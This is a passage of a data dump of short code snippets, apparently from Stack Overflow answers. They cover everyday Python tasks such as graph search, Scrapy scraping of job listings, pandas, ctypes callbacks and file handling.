</snippet></ROW><ROW><id>20387660</id><snippet>first_dict.viewkeys() &amp; second_dict</snippet></ROW><ROW><id>20387660</id><snippet>dict.viewkeys()</snippet></ROW><ROW><id>20387725</id><snippet>Pool()</snippet></ROW><ROW><id>20387725</id><snippet>Pool()</snippet></ROW><ROW><id>20387725</id><snippet>Pool()</snippet></ROW><ROW><id>20387725</id><snippet>Pool.close()</snippet></ROW><ROW><id>20387725</id><snippet>Pool</snippet></ROW><ROW><id>20387725</id><snippet>Pool.close()</snippet></ROW><ROW><id>20387725</id><snippet>Pool.join()</snippet></ROW><ROW><id>20387725</id><snippet>Pool.join()</snippet></ROW><ROW><id>20387730</id><snippet>&gt;&gt;&gt; backtrace(path_holder, 'node1', 'GOAL')
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "q20349609.py", line 13, in backtrace
    dct.update(d)
ValueError: dictionary update sequence element #0 has length 1; 2 is required
</snippet></ROW><ROW><id>20387730</id><snippet>for d in path_holder:
</snippet></ROW><ROW><id>20387730</id><snippet>d</snippet></ROW><ROW><id>20387730</id><snippet>'node1'</snippet></ROW><ROW><id>20387730</id><snippet>'node2'</snippet></ROW><ROW><id>20387730</id><snippet>dict.update</snippet></ROW><ROW><id>20387730</id><snippet>path_holder</snippet></ROW><ROW><id>20387730</id><snippet>dct</snippet></ROW><ROW><id>20387730</id><snippet>dct = dict(path_holder)
</snippet></ROW><ROW><id>20387730</id><snippet>path_holder</snippet></ROW><ROW><id>20387730</id><snippet>if j not in path:
    if j == goal:
        path.append(i)
</snippet></ROW><ROW><id>20387730</id><snippet>j</snippet></ROW><ROW><id>20387730</id><snippet>goal</snippet></ROW><ROW><id>20387730</id><snippet>if j not in path:
</snippet></ROW><ROW><id>20387730</id><snippet>if i not in path:
</snippet></ROW><ROW><id>20387730</id><snippet>i</snippet></ROW><ROW><id>20387730</id><snippet>print(path)</snippet></ROW><ROW><id>20387730</id><snippet>path.append(i)</snippet></ROW><ROW><id>20387730</id><snippet>&gt;&gt;&gt; backtrace(path_holder, 'node1', 'GOAL')
['GOAL', 'node6']
['GOAL', 'node6', 'node3']
['GOAL', 'node6', 'node3', 'node4']
</snippet></ROW><ROW><id>20387730</id><snippet>node3</snippet></ROW><ROW><id>20387730</id><snippet>node4</snippet></ROW><ROW><id>20387730</id><snippet>node4</snippet></ROW><ROW><id>20387730</id><snippet>GOAL</snippet></ROW><ROW><id>20387730</id><snippet>node3</snippet></ROW><ROW><id>20387730</id><snippet>node3</snippet></ROW><ROW><id>20387730</id><snippet>node4</snippet></ROW><ROW><id>20387730</id><snippet>GOAL</snippet></ROW><ROW><id>20387730</id><snippet>node1</snippet></ROW><ROW><id>20387730</id><snippet>node4</snippet></ROW><ROW><id>20387730</id><snippet>GOAL</snippet></ROW><ROW><id>20387730</id><snippet>node1</snippet></ROW><ROW><id>20387730</id><snippet>node3</snippet></ROW><ROW><id>20387730</id><snippet>visited</snippet></ROW><ROW><id>20387730</id><snippet>start</snippet></ROW><ROW><id>20387730</id><snippet>collections.deque</snippet></ROW><ROW><id>20387730</id><snippet>from collections import deque

class NotFound(Exception): pass

def search(graph, start, goal):
    """Find the shortest path from start to goal in graph (which must be a
    map from a node to an iterable of adjacent nodes), using
    breadth-first search.

        &gt;&gt;&gt; graph = {
        ...     1: [2, 4, 5],  
        ...     2: [1],
        ...     3: [4, 6],
        ...     4: [2, 1, 3],
        ...     5: [],
        ...     6: [7],
        ...     7: [],
        ... }
        &gt;&gt;&gt; search(graph, 1, 7)
        [1, 4, 3, 6, 7]
        &gt;&gt;&gt; search(graph, 1, 1)
        [1]
        &gt;&gt;&gt; search(graph, 5, 1) # doctest: +IGNORE_EXCEPTION_DETAIL
        Traceback (most recent call last):
            ...
        NotFound: No path from 5 to 1

    """
    visited = {start: None}
    queue = deque([start])
    while queue:
        node = queue.popleft()
        if node == goal:
            path = []
            while node is not None:
                path.append(node)
                node = visited[node]
            return path[::-1]
        for neighbour in graph[node]:
            if neighbour not in visited:
                visited[neighbour] = node
                queue.append(neighbour)
    raise NotFound('No path from {} to {}'.format(start, goal))
</snippet></ROW><ROW><id>20387730</id><snippet>path_holder</snippet></ROW><ROW><id>20387730</id><snippet>graph</snippet></ROW><ROW><id>20387730</id><snippet>doctest</snippet></ROW><ROW><id>20387765</id><snippet>random.choice()</snippet></ROW><ROW><id>20387765</id><snippet>random.sample()</snippet></ROW><ROW><id>20387765</id><snippet>with open('wordlist.txt') as wlist:
    words = [w.strip() for w in wlist]
with open('output.txt', 'w') as output:
    for word in random.sample(words, 12):
        output.write(word + '\n')
</snippet></ROW><ROW><id>20387765</id><snippet>random.sample()</snippet></ROW><ROW><id>20387765</id><snippet>output.txt</snippet></ROW><ROW><id>20387765</id><snippet>with open('wordlist.txt') as wlist:
    words = [w.strip() for w in wlist]

with open('output.txt', 'r') as output:
    seen = {w.strip() for w in output}

with open('output.txt', 'a') as output:
    count = 0
    while count &lt; 12:
        new_word = random.choice(words)
        if new_word in seen:
            words.remove(new_word)
            continue
        seen.add(new_word)
        output.write(new_word + '\n')
        count += 1
</snippet></ROW><ROW><id>20387765</id><snippet>output.txt</snippet></ROW><ROW><id>20387765</id><snippet>'a'</snippet></ROW><ROW><id>20387788</id><snippet>scrapy startproject craig &amp;&amp; cd craig
</snippet></ROW><ROW><id>20387788</id><snippet>items.py</snippet></ROW><ROW><id>20387788</id><snippet>from scrapy.item import Item, Field

class CraigItem(Item):
    title = Field()
    link = Field()
</snippet></ROW><ROW><id>20387788</id><snippet>scrapy genspider -t basic craig_spider 'randstad.nl'
</snippet></ROW><ROW><id>20387788</id><snippet>spiders/craig_spider.py</snippet></ROW><ROW><id>20387788</id><snippet>from scrapy.spider import BaseSpider
from scrapy.selector import Selector
from craig.items import CraigItem
from scrapy.http import Request

class CraigSpiderSpider(BaseSpider):
    name = "craig_spider"
    allowed_domains = ["randstad.nl"]
    start_urls = ( 
        "http://www.randstad.nl/mwp2/faces/baanZoeken?afstand=10&amp;pagina=1&amp;_adf.ctrl-state=sb0riset7_4&amp;sc=0&amp;filters=vakgebied!5626&amp;_afrLoop=",
        )   

    def parse(self, response):
        sel = Selector(response)

        for link in sel.xpath("//a[contains(@class, 'outer-read-more-link')]/@href").extract():
            yield Request(link, callback=self.parse)

        text_list = sel.xpath('//div[@id="basePage:page:twoColumn:r2:0:functieOmschrijvingPanel::content"]/text()').extract()
        if text_list:
            text = '\n'.join(text_list)
            item = CraigItem()
            item['link'] = response.url
            item['title'] = text
            yield item
</snippet></ROW><ROW><id>20387788</id><snippet>links = hxs.select("//div[@class='search-result af_panelGroupLayout']")
</snippet></ROW><ROW><id>20387788</id><snippet>links.select("//a[contains(@class, 'outer-read-more-link')]/@href")
</snippet></ROW><ROW><id>20387788</id><snippet>//a[...]</snippet></ROW><ROW><id>20387788</id><snippet>links</snippet></ROW><ROW><id>20387788</id><snippet>xpath</snippet></ROW><ROW><id>20387788</id><snippet>yield</snippet></ROW><ROW><id>20387788</id><snippet>callback</snippet></ROW><ROW><id>20387788</id><snippet>scrapy crawl craig_spider -o craig.json -t json
</snippet></ROW><ROW><id>20387788</id><snippet>json</snippet></ROW><ROW><id>20387788</id><snippet>[{"link": "http://www.randstad.nl/vacatures/1486457/klantadviseur-glasvezel-tijdelijk-%28m-v%29", "title": "Wil je per direct aan de slag in een afwisselend project?  Heb jij ervaring in de glasvezel- of ICT-branche? Werk jij graag in een hectische, dynamische omgeving?\nDan hebben wij een leuke tijdelijke baan voor jou! \nDeze snelgroeiende en onafhankelijke serviceprovider levert een breed scala aan diensten zoals internet, televisie en telefonie op het glasvezelnetwerk . \nIn deze veelzijdige functie ben je verantwoordelijk voor een zo positief mogelijke klantbeleving. Je zorgt voor een proactieve, deskundige advisering aan klanten over diensten en de levering ervan. Je bent verantwoordelijk voor de Backoffice Support van het Klant Contact Center, je denkt actief mee over verbeteringen in communicatie, applicaties en de manier van werken binnen het bedrijf. Je ziet kansen in alle dagelijkse handelingen om de commercie te verhogen op de afdeling.\nWat ga je doen?\nBeantwoorden van tweede- en derdelijns vragen van klanten en externe partners, \nBewaken van procedures voor correcte administratieve afhandeling,\nVerwerken van orders en uitsturen hiervan per post en e-mail,\nBijdragen aan optimaliseren primaire klantprocessen.\nWie ben jij?\nJe hebt een opleiding afgerond op MBO+/HBO niveau, of bent studerend aan HBO of WO,\nMinimaal 1 jaar inbound contactcenterervaring,\nJe hebt een perfecte beheersing van de Nederlandse taal in woord en geschrift,\nErvaring met het Office pakket,\nWerkervaring in glasvezel- en/of ICT-branche is een grote pr\u00e9\nVerder ben je:\nBetrokken, betrouwbaar, transparant en innovatief,\nZelfstandig,\nKlantgericht en commercieel,\nJe vindt het leuk om klanten te enthousiasmeren,\nJe bent een oplossingsgerichte teamspeler en je hebt affiniteit met ICT.\nZie jij jezelf als de perfecte kandidaat voor deze baan? Dan horen we graag vandaag nog van je! Reageer direct via de solliciteer button met je Cv en vertel ons waarom jij de geschikte kandidaat bent voor deze functie!"},
{"link": "http://www.randstad.nl/vacatures/1360086/embedded-software-design-engineer-electric-controls-%28m-v%29", "title": "Ben jij degene die nieuwe dingen bedenkt? Doe je dat het liefst in een team van specialisten? En vind je het leuk bezig te zijn in het werkveld van elektrische installaties voor (railgebonden) voertuigen? lees dan snel verder...\nWat ga jij doen?\nOpstellen van systeem-, product- en module specificaties conform bestek, normen en voorschriften\nHet opstellen van softwarespecificaties en het ontwerp van de software\nFormuleren en uitvoeren van testplannen voor afname beproevingen\nRisicomanagement door toepassing van FMEA en FTA\nOpstellen van ontwerp- en gebruikers documentatie\nRapporteren aan de projectleider\n \nWat verwachten wij van jou?\nMinimaal een HBO-opleiding (Bij voorkeur WO), richting elektrotechniek, embedded systems of gelijkwaardig vakgebied\nRelevante ervaring met het toepassen van normen en richtlijnen voor kwaliteit en veiligheid\nUitstekende communicatieve vaardigheden\nSterk ontwikkeld analytisch denkvermogen\nUitstekende beheersing van de Engels en Nederlandse taal is noodzakelijk\nKennis van en ervaring met elektrische installaties voor railgebonden voertuigen\nKennis van en ervaring met CAN, MVB, C/C++, .NET/C#, FPGA, real-time OS, TCMS, CMMI, EN61508 SIL3, EN50128, FMEA en Matlab/Simulink\nHerken jij jezelf in dit profiel en heb jeinmiddels een aantal jaar werkervaring in jouw vakgebied? Ben jij toe aan de volgende stap in je carriere reageer dan snel via 06-15087716 of mail bas.kooter.rnl@nl.randstad.com"},
...
]
</snippet></ROW><ROW><id>20387788</id><snippet>0.20</snippet></ROW><ROW><id>20387788</id><snippet>Selector</snippet></ROW><ROW><id>20387807</id><snippet>declarative_base</snippet></ROW><ROW><id>20387807</id><snippet>def _declarative_constructor(self, **kwargs):
    """A simple constructor that allows initialization from kwargs.

    Sets attributes on the constructed instance using the names and
    values in ``kwargs``.

    Only keys that are present as
    attributes of the instance's class are allowed. These could be,
    for example, any mapped columns or relationships.
    """
    cls_ = type(self)
    for k in kwargs:
        if not hasattr(cls_, k):
            raise TypeError(
                "%r is an invalid keyword argument for %s" %
                (k, cls_.__name__))
        setattr(self, k, kwargs[k])
_declarative_constructor.__name__ = '__init__'
</snippet></ROW><ROW><id>20387807</id><snippet>def _declarative_positional_constructor(self, *args, **kwargs):
    assert len(kwargs) == 0
    column_names = tuple(c.name for c in self.__mapper__.columns if not(c in self.__mapper__.primary_key))
    assert len(column_names) == len(args)
    for name, value in zip(column_names, args):
        setattr(self, name, value)
_declarative_positional_constructor.__name__ = '__init__'

# ...
# use own default constructor
Base = declarative_base(constructor = _declarative_positional_constructor)
</snippet></ROW><ROW><id>20387807</id><snippet>autoload</snippet></ROW><ROW><id>20387926</id><snippet>class Action(object):
    pass


class HealthAction(Action):
    triggers = ("life", "health")

    def perform(self):
        print health


class Room(object):
    actions = [HealthAction()] # this list contains actions applicable to all rooms
    room_actions = [] # this list contains room-specific actions

    def enter(self):
        while True:
            response = raw_input("What would you like to do? ")
            for action in self.actions + self.room_actions:
                if any(x in response for x in action.triggers):
                    action.perform()

class RoomOne(Room):
    room_actions = [] # you can add room-specific actions here
</snippet></ROW><ROW><id>20387926</id><snippet>health</snippet></ROW><ROW><id>20387926</id><snippet>Player</snippet></ROW><ROW><id>20387997</id><snippet>cursor = connections['prod'].cursor()
cursor.execute('''Your SQL''')
row = cursor.fetchone()

# do what you need to do with the first result set

cursor.nextset() #sets cursor to the next result set

# fetchone or fetchall and do whatever you want with the next result set
</snippet></ROW><ROW><id>20388084</id><snippet>comb</snippet></ROW><ROW><id>20388084</id><snippet>list1</snippet></ROW><ROW><id>20388084</id><snippet>list2</snippet></ROW><ROW><id>20388084</id><snippet>comb[0]</snippet></ROW><ROW><id>20388084</id><snippet>list1</snippet></ROW><ROW><id>20388084</id><snippet>&gt;&gt;&gt; list1 = range(0, 2)
&gt;&gt;&gt; list2 = range(2, 4)
&gt;&gt;&gt; comb = list1, list2
&gt;&gt;&gt; id(list1)
28888960
&gt;&gt;&gt; id(comb[0])
28888960
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20388084</id><snippet>list1</snippet></ROW><ROW><id>20388084</id><snippet>comb[0]</snippet></ROW><ROW><id>20388084</id><snippet>comb</snippet></ROW><ROW><id>20388084</id><snippet>list1</snippet></ROW><ROW><id>20388084</id><snippet>list2</snippet></ROW><ROW><id>20388084</id><snippet>&gt;&gt;&gt; list1 = range(0, 2)
&gt;&gt;&gt; list2 = range(2, 4)
&gt;&gt;&gt; # [:] creates a shallow copy of the lists.
&gt;&gt;&gt; comb = list1[:], list2[:]
&gt;&gt;&gt; id(list1)
28930176
&gt;&gt;&gt; id(comb[0])
28931696
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20388084</id><snippet>list1</snippet></ROW><ROW><id>20388084</id><snippet>comb[0]</snippet></ROW><ROW><id>20388100</id><snippet>null</snippet></ROW><ROW><id>20388100</id><snippet>&gt; db.foo.insert({a: null})
&gt; db.foo.insert({})
db.foo.find({a: null}, {_id: 0})
{ "a" : null }
{  }
</snippet></ROW><ROW><id>20388100</id><snippet>pymongo</snippet></ROW><ROW><id>20388100</id><snippet>&gt;&gt;&gt; [doc for doc in pymongo.MongoClient().test.foo.find({'a': None}, {'_id': 0})]
[{u'a': None}, {}]
</snippet></ROW><ROW><id>20388100</id><snippet>None</snippet></ROW><ROW><id>20388100</id><snippet>dict.get</snippet></ROW><ROW><id>20388115</id><snippet>timeit</snippet></ROW><ROW><id>20388115</id><snippet>from __future__ import print_function
import timeit

setup = '''
def return_five():
    return 6

def f1():
    return [return_five() for i in range(10000)]

def f2():
    r = return_five
    return [r() for i in range(10000)]
'''

print('Not a local variable:')
print(min(timeit.Timer('a = f1()', setup=setup).repeat(7, 1000)))

print('Local variable:')
print(min(timeit.Timer('a = f2()', setup=setup).repeat(7, 1000)))
</snippet></ROW><ROW><id>20388115</id><snippet>Not a local variable:
1.22310686111
Local variable:
1.17974805832
</snippet></ROW><ROW><id>20388115</id><snippet>f2</snippet></ROW><ROW><id>20388115</id><snippet>return_five</snippet></ROW><ROW><id>20388115</id><snippet>f1</snippet></ROW><ROW><id>20388115</id><snippet>f2</snippet></ROW><ROW><id>20388115</id><snippet>f1</snippet></ROW><ROW><id>20388188</id><snippet>np.round</snippet></ROW><ROW><id>20388188</id><snippet>10**n</snippet></ROW><ROW><id>20388188</id><snippet>n</snippet></ROW><ROW><id>20388188</id><snippet>round</snippet></ROW><ROW><id>20388188</id><snippet>round</snippet></ROW><ROW><id>20388188</id><snippet>&gt;&gt;&gt; np.round(2.685, 2)
2.6800000000000002
&gt;&gt;&gt; round(2.685, 2)
2.69
</snippet></ROW><ROW><id>20388188</id><snippet>round(2.675 * 10.**2)</snippet></ROW><ROW><id>20388188</id><snippet>round(2.675, 2)</snippet></ROW><ROW><id>20388208</id><snippet>message_callback(self, data)</snippet></ROW><ROW><id>20388208</id><snippet>self.callback_func = A.CALLBACK(self.message_callback)</snippet></ROW><ROW><id>20388208</id><snippet>A.CALLBACK</snippet></ROW><ROW><id>20388208</id><snippet>typedef int (*callback_t)(void *data);

int test(const char *data, callback_t f) {
    f((void *)data); 
    return 0;
}
</snippet></ROW><ROW><id>20388208</id><snippet>from ctypes import *

class A(object):
    CALLBACK = CFUNCTYPE(c_uint32, c_void_p)

    def __init__(self):        
        self.callback_func = A.CALLBACK(self.message_callback)
        self.param = None

    def message_callback(self, data):
        self.param = cast(data, c_char_p).value
        return 0
</snippet></ROW><ROW><id>20388208</id><snippet>&gt;&gt;&gt; lib = CDLL('./lib.so')
&gt;&gt;&gt; a = A()
&gt;&gt;&gt; lib.test.argtypes = [c_char_p, A.CALLBACK]
&gt;&gt;&gt; lib.test("updated", a.callback_func)
0
&gt;&gt;&gt; a.param
'updated'
</snippet></ROW><ROW><id>20388214</id><snippet>from collections import Counter

cnt = Counter(lst)
print {gender: {name: cnt[name] for name in persons if persons[name] == gender}
          for gender in set(persons.values())}

# {'Eunuch': {'Varys': 1}, 
# 'Male': {'Tyrion': 3, 'Hodor': 2, 'Theon': 0}, 
# 'Female': {'Daenerys': 2, 'Arya': 1, 'Sansa': 0}}
</snippet></ROW><ROW><id>20388214</id><snippet>def percentage_dict(d):
    s = float(sum(d.values()))
    return {k: 100 * v / s for k, v in d.items()}
</snippet></ROW><ROW><id>20388214</id><snippet>print {gender: percentage_dict({name: cnt[name] for name in persons if persons[name] == gender})
       for gender in set(persons.values())}

# {'Eunuch': {'Varys': 100.0}, 'Male': {'Hodor': 40.0, 'Theon': 0.0, 'Tyrion': 60.0}, 'Female': {'Daenerys': 66.66666666666667, 'Arya': 33.333333333333336, 'Sansa': 0.0}}
</snippet></ROW><ROW><id>20388214</id><snippet>def invert(d):
    """Turn {a:x, b:x} into {x:[a,b]}"""
    r = {}
    for k, v in d.items():
        r.setdefault(v, []).append(k)
    return r
</snippet></ROW><ROW><id>20388214</id><snippet>cnt = Counter(lst)
print {gender: {name: cnt[name] for name in names}
       for gender, names in invert(persons).items()}
</snippet></ROW><ROW><id>20388214</id><snippet>print {gender: {name: cnt[name] for name in names}
    for gender, names in invert(persons).items()
    if any(cnt[name] for name in names)
}
</snippet></ROW><ROW><id>20388234</id><snippet>aaaaaaaaaaaaaaaaaaa\n
bbbbbbbbbbbbbbbbbbb\n
ccccccccccccccccccc\n
ddddddddddddddddddd\n
</snippet></ROW><ROW><id>20388234</id><snippet>aaaaaaaaaaaaaaaaaaa\n
bbbbbbbbbbbbbbbbbbb\n
ccccccccccccccccccc\n
ddddddddddddddddddd\n
\n
eeeeeeeeeeeeeeeeeee
</snippet></ROW><ROW><id>20388234</id><snippet>with open(filename, "a") as updatedFile:
    nextLine="%s\n" % (lineToAdd)
    updatedFile.write(nextLine)
</snippet></ROW><ROW><id>20388234</id><snippet>aaaaaaaaaaaaaaaaaaa\n
bbbbbbbbbbbbbbbbbbb\n
ccccccccccccccccccc\n
ddddddddddddddddddd\n
eeeeeeeeeeeeeeeeeee\n
</snippet></ROW><ROW><id>20388271</id><snippet>my.cnf</snippet></ROW><ROW><id>20388271</id><snippet> character-set-server = utf8mb4
 collation-server = utf8mb4_unicode_ci
</snippet></ROW><ROW><id>20388271</id><snippet>utf8</snippet></ROW><ROW><id>20388305</id><snippet>import random
campers = {'pb' : 'Pooder Bennet', 'jf' : 'Jupiter Fargo',
           'rb' : 'Randy Buffet', 'bl' : 'Botany Lynn',
       'bt' : 'Boris Tortavich', 'tn' : 'Trinda Noober',
       'fj' : 'Freetus Jaunders', 'nt' : 'Ninar Tetris', 
       'gm' : 'Gloobin Marfo', 'nk' : 'Niche Kaguya',
       'bd' : 'Brent Drago', 'vt' : 'Volga Toober',
       'kt' : 'Kinser Talebearing', 'br' : 'Bnola Rae',
       'nb' : 'Nugget Beano', 'yk' : 'Yeldstat Krong',
       'gy' : 'Gelliot Yabelor', 'il' : 'Illetia Dorfson',
       'ct' : 'Can Tabber', 'tv' : 'Trinoba Vyder'}

campers_outside_theater = random.sample(campers.keys(), 5)
people = campers_outside_theater #+ ['Troid, the counselor from the bus.']
choices = '\n\n'.join('%d. %s' % (i + 1, campers[p]) for (i, p) in enumerate(people))
print(choices)
</snippet></ROW><ROW><id>20388305</id><snippet>keys(people)</snippet></ROW><ROW><id>20388305</id><snippet>KeyError</snippet></ROW><ROW><id>20388305</id><snippet>NameError</snippet></ROW><ROW><id>20388305</id><snippet>keys</snippet></ROW><ROW><id>20388305</id><snippet>enumerate(people)</snippet></ROW><ROW><id>20388305</id><snippet>'Troid, the counselor from the bus.'</snippet></ROW><ROW><id>20388520</id><snippet>(name, addr)</snippet></ROW><ROW><id>20388520</id><snippet>addr.split('@')</snippet></ROW><ROW><id>20388520</id><snippet>msg = email.message_from_string(data[0][1])
addr = email.utils.parseaddr(msg['From'])[1]
domain = addr.split('@')[1]
if domain == "example.com":
    print "Verified requester"
</snippet></ROW><ROW><id>20388598</id><snippet>fillna</snippet></ROW><ROW><id>20388598</id><snippet> In [10]: df
 Out [10]:
         one       two 
 a  2.472772  1.135219 
 b       NaN       NaN 
 c  0.863937  1.224622 
 d       NaN  0.012517 

 In [11]: df2 = df.fillna(0)

 In [12]: df2 
 Out [12]: 
         one       two 
 a  2.472772  1.135219 
 b  0.000000  0.000000 
 c  0.863937  1.224622 
 d  0.000000  0.012517 
</snippet></ROW><ROW><id>20388723</id><snippet>sudo apt-get install libmemcached-dev
</snippet></ROW><ROW><id>20388816</id><snippet>python-3.x</snippet></ROW><ROW><id>20388816</id><snippet>0x01</snippet></ROW><ROW><id>20388816</id><snippet>0x1f</snippet></ROW><ROW><id>20388816</id><snippet>DEL</snippet></ROW><ROW><id>20388816</id><snippet>0x7f</snippet></ROW><ROW><id>20388816</id><snippet>import re
import sys

_, infile, outfile = sys.argv

s_pat_row = r'''
    "([^"]+)"  # match column; this is group 1
    \s*,\s*  # match separating comma and any optional white space
    (\S+)  # match column; this is group 2
    \s*,\s*  # match separating comma and any optional white space
    "((?:\\"|[^"])*)"  # match string data that can include escaped quotes
'''
pat_row = re.compile(s_pat_row, re.MULTILINE|re.VERBOSE)

s_pat_clean = r'''[\x01-\x1f\x7f]'''
pat_clean = re.compile(s_pat_clean)

row_template = '"{}",{},"{}"\n'

with open(infile, "rt") as inf, open(outfile, "wt") as outf:
    data = inf.read()
    for m in re.finditer(pat_row, data):
        row = m.groups()
        cleaned = re.sub(pat_clean, ' ', row[2])
        words = cleaned.split()
        cleaned = ' '.join(words)
        outrow = row_template.format(row[0], row[1], cleaned)
        outf.write(outrow)
</snippet></ROW><ROW><id>20388816</id><snippet>s_pat_clean</snippet></ROW><ROW><id>20388816</id><snippet>cleaner.py</snippet></ROW><ROW><id>20388816</id><snippet>data.txt</snippet></ROW><ROW><id>20388816</id><snippet>python3 cleaner.py data.txt cleaned.txt
</snippet></ROW><ROW><id>20388816</id><snippet>cleaned.txt</snippet></ROW><ROW><id>20388816</id><snippet>"from_user","month","full_text"
"bellaboo",4,"RT @BodilMalmsten: \"om man klarar av att föra ett bestick till munnen eller behöver hjälp på toaletten\"Have a heart, borgarrådet Have a hea,RT @BodilMalmsten: Borgarrådet om riktlinjerna \"om man klarar av att föra ett bestick till munnen eller behöver hjälp på toaletten\" Hjälp 1 min dröm 2 allas önskningar 3 viljan att segra H,RT @BodilMalmsten: Klarar du av att föra ett bestick till munnen eller behöver hjälp på toaletten? http://t.co/fcvcf0U2dW"
</snippet></ROW><ROW><id>20388844</id><snippet># weapon.py
class Weapon:
    def __init__(self, name, dmg):
        self.name = name
        self.dmg  = dmg

    def attack(self, target):
        target.health -= self.dmg

# fighter.py
class Fighter:
    def __init__(self, name, weapon=None):
        self.name   = name
        self.weapon = weapon

    def attack(self, target):
        if self.weapon is None:
            # punch him
            target.health -= 2
        else:
            self.weapon.attack(target)
</snippet></ROW><ROW><id>20388855</id><snippet>class fubar(object):

    def __eq__(self, other):
        'Fubar objects are considered equal if they have the same contents'
        if type(self) != type(other):
            return NotImplemented
        return vars(self) == vars(other)
</snippet></ROW><ROW><id>20389000</id><snippet>import urllib2

user = 'admin'
pwd = 'notmyrealpassword'
host = '192.168.1.1'
url = 'http://' + host + '/traffic_meter_2nd.htm'

passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
passman.add_password(None, host, user, pwd)
authhandler = urllib2.HTTPBasicAuthHandler(passman)

opener = urllib2.build_opener(authhandler)
response = opener.open(url)
stuff = response.read()
response.close()

print stuff
</snippet></ROW><ROW><id>20389065</id><snippet>import csv
import sys
from collections import Counter

def load_csv(fname, **kwargs):
    with open(fname, 'rb') as inf:
        in_csv = csv.reader(inf, **kwargs)
        return list(in_csv)

def save_csv(fname, data, header=None, **kwargs):
    with open(fname, 'wb') as outf:
        out_csv = csv.writer(outf, **kwargs)
        if header is not None:
            out_csv.writerow(header)
        out_csv.writerows(data)

def main(in_fname, out_fname):
    data = load_csv(in_fname, delimiter='\t')

    filtered = (row for row in data if len(Counter(row).items()) &gt;= 4)
    # save_csv(out_fname, filtered, delimiter='\t')     # just skip this step!

    replace = dict(zip(
        ['A', 'G',  'C', 'T',  'Y',  'R', 'W',  'S',  'K',  'M', 'X', 'N', '-'],
        ['2', '19', '5', '29', '17', '7', '11', '13', '23', '3', '0', '0', '0']
    ))
    replaced = ([replace.get(item, item) for item in row] for row in filtered)
    save_csv(out_fname, replaced, delimiter='\t')

if __name__=="__main__":
    if len(sys.argv) &lt; 3:
        print('Usage: myprog.py input.csv output.csv')
    else:
        main(sys.argv[1], sys.argv[2])
</snippet></ROW><ROW><id>20389148</id><snippet>def f(df):
    mask = np.cumsum((df.hasTattoo == "Y").values) &lt;= 1
    return df[mask]

df.groupby("person").apply(f)
</snippet></ROW><ROW><id>20389148</id><snippet>def f(df):
    mask = (df.hasTattoo == "Y").cumsum() &lt;= 1
    return df[mask]

df.groupby("person").apply(f)
</snippet></ROW><ROW><id>20389190</id><snippet>import os

with os.popen( 'ls' ) as pipe:
    for line in pipe:
        print ( line.strip( ) )
</snippet></ROW><ROW><id>20389190</id><snippet>subprocess.Popen</snippet></ROW><ROW><id>20389190</id><snippet>from subprocess import Popen, PIPE
pipe = Popen('ls', shell=True, stdout=PIPE )

for line in pipe.stdout:
    print( line.strip( ) )
</snippet></ROW><ROW><id>20389201</id><snippet>use Text::CSV;

$csv = Text::CSV-&gt;new({ eol =&gt; "\n" });

sub out {
  $csv-&gt;print(\*STDOUT, \@cols);
  @cols = ();
}

while (&lt;&gt;) {
  chomp;
  out() if /^\s*$/;
  push @cols, $_;
}

out() if @cols;
</snippet></ROW><ROW><id>20389560</id><snippet>session.new</snippet></ROW><ROW><id>20389560</id><snippet>.dirty</snippet></ROW><ROW><id>20389560</id><snippet>.deleted</snippet></ROW><ROW><id>20389682</id><snippet>def func(a):
    return (a,a+1,a*2)

a,b,c = func(7)
print a,b
</snippet></ROW><ROW><id>20389682</id><snippet>a = func(3)
print a
</snippet></ROW><ROW><id>20389682</id><snippet>a,b = func(9)
print a,b
</snippet></ROW><ROW><id>20389730</id><snippet>i = 0
ml = []
for el in b_List:
    if (b_List): # b_list is a list and will evaluate to True
                 # unless you have an empty list, you want if (el)
        i += 1
    ml.append(i) # even if the above line was correct you still get here
                 # on every iteration, and you don't want that
    i = 0
</snippet></ROW><ROW><id>20389730</id><snippet>def count_Trues(b_list):
    i = 0
    ml = []
    prev = False
    for el in b_list:
        if el:
            i += 1
            prev = el
        else:
            if prev is not el:
                ml.append(i)
                i = 0
            prev = el
    if el:
        ml.append(i)
    return m
</snippet></ROW><ROW><id>20389730</id><snippet>&gt;&gt;&gt; T, F = True, False
&gt;&gt;&gt; b_List = [T,T,T,F,F,F,F,T,T,T,F,F,T,F] 
&gt;&gt;&gt; count_Trues(b_List)
[3, 3, 1]
&gt;&gt;&gt; b_List.extend([T,T])
&gt;&gt;&gt; count_Trues(b_List)
[3, 3, 1, 2]
&gt;&gt;&gt; b_List.extend([F])
&gt;&gt;&gt; count_Trues(b_List)
[3, 3, 1, 2]
</snippet></ROW><ROW><id>20389730</id><snippet>In [5]: T, F = True, False

In [6]: b_List = [T,T,T,F,F,F,F,T,T,T,F,F,T,F] 

In [7]: new_b_List = b_List * 100

In [8]: import numpy as np

# Ashwini Chaudhary's Solution
In [9]: %timeit np.diff(np.insert(np.where(np.diff(new_b_List)==1)[0]+1, 0, 0))[::2]
1000 loops, best of 3: 299 us per loop

In [11]: %timeit count_Trues(new_b_List)
1000 loops, best of 3: 130 us per loop

In [12]: new_b_List = b_List * 1000

# Ashwini Chaudhary's Solution 
In [13]: %timeit np.diff(np.insert(np.where(np.diff(new_b_List)==1)[0]+1, 0, 0))[::2]
100 loops, best of 3: 2.25 ms per loop

In [14]: %timeit count_Trues(new_b_List)
100 loops, best of 3: 1.33 ms per loop
</snippet></ROW><ROW><id>20389780</id><snippet>if imagesNamesList==["None" for x in range(len(listOfImages))]:
#                                                     here--^
</snippet></ROW><ROW><id>20389780</id><snippet>if imagesNamesList == ["None"]*len(listOfImages):
</snippet></ROW><ROW><id>20389780</id><snippet>if all(x == "None" for x in imagesNamesList) and len(imagesNamesList) == len(listOfImages):
</snippet></ROW><ROW><id>20389780</id><snippet>all</snippet></ROW><ROW><id>20389780</id><snippet>x == "None"</snippet></ROW><ROW><id>20389780</id><snippet>False</snippet></ROW><ROW><id>20389903</id><snippet>lex = words.lower().split()
</snippet></ROW><ROW><id>20390056</id><snippet>foo.proxy.widget</snippet></ROW><ROW><id>20390082</id><snippet>#!/bin/bash   
for f in *.html;
   do
   title=$( awk 'BEGIN{IGNORECASE=1;FS="&lt;title&gt;|&lt;/title&gt;";RS=EOF} {print $2}' "$f" )
   mv -i "$f" "${title//[^a-zA-Z0-9\._\- ]}".html   
done
